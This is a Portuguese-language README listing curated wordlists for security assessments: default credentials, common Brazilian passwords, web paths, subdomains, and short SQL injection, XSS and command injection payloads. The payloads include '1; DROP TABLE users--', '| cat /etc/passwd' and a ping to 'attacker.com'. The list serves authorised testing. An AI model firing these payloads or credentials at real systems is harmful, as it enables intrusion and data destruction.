# Wordlists Curated

Colecao curada de wordlists para uso em testes de seguranca e assessments.

## Wordlists de Credenciais

### Default Credentials
Lista de credenciais padrao para dispositivos e aplicacoes comuns:
- `admin:admin`, `admin:password`, `root:root`, `root:toor`
- `administrator:password`, `test:test`, `guest:guest`
- Credenciais padrao de vendors: Cisco, Fortinet, Palo Alto, F5

### Common Passwords (Top 50 BR)
Passwords mais comuns em vazamentos brasileiros:
- `123456`, `123456789`, `12345`, `brasil`, `senha`
- `102030`, `1234`, `flamengo`, `palmeiras`, `corinthians`
- `gabriel`, `matheus`, `lucas`, `familia`, `amor`

## Wordlists de Discovery

### Web Directories
Paths comuns para directory brute-forcing:
- `/admin`, `/api`, `/backup`, `/config`, `/debug`
- `/swagger`, `/graphql`, `/.env`, `/.git`, `/wp-admin`
- `/actuator`, `/health`, `/metrics`, `/phpmyadmin`

### Subdomains
Prefixos comuns para subdomain enumeration:
- `api`, `app`, `admin`, `staging`, `dev`, `test`
- `mail`, `vpn`, `portal`, `sso`, `cdn`, `docs`
- `jenkins`, `gitlab`, `grafana`, `kibana`, `jira`

## Wordlists de Fuzzing

### SQL Injection Payloads
- `' OR 1=1--`, `" OR ""="`, `1; DROP TABLE users--`
- `' UNION SELECT NULL--`, `admin'--`, `1' AND '1'='1`

### XSS Payloads
- `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`
- `javascript:alert(1)`, `<svg/onload=alert(1)>`

### Command Injection
- `; ls -la`, `| cat /etc/passwd`, `` `whoami` ``
- `$(id)`, `%0aid`, `|| ping -c 3 attacker.com`

## Notas de Uso

Estas wordlists sao ponto de partida. Customizar conforme o alvo e contexto.
Sempre obter autorizacao formal antes de usar em ambiente de producao.
Ferramentas recomendadas: Burp Suite Intruder, ffuf, gobuster, wfuzz.
